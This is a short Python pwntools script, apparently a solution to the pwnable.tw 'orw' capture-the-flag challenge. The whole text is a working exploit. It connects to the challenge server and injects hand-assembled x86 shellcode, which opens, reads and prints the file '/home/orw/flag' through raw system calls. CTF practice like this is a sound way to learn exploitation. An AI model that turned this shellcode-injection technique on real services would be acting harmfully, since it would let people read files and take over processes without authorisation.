from pwn import *

# p = process("./orw")
p=remote("chall.pwnable.tw", 10001)


shellcode = asm("\n".join([
    "push %d" % u32(b"ag\0\0"),
    "push %d" % u32(b"w/fl"),
    "push %d" % u32(b"e/or"),
    "push %d" % u32(b"/hom"),
    "xor edx, edx",
    "xor ecx, ecx",
    "mov ebx, esp",
    "mov eax, 0x5",
    "int 0x80",
    "mov ecx, esi",
    "mov ebx, eax",
    "mov edx, 0x100",
    "mov eax, 0x3",
    "int 0x80",
    "mov ebx, 0x1",
    "mov ecx, esi",
    "mov edx, eax",
    "mov eax, 0x4",
    "int 0x80"
]))
p.recvuntil(b"shellcode:")

p.send(shellcode)
p.interactive()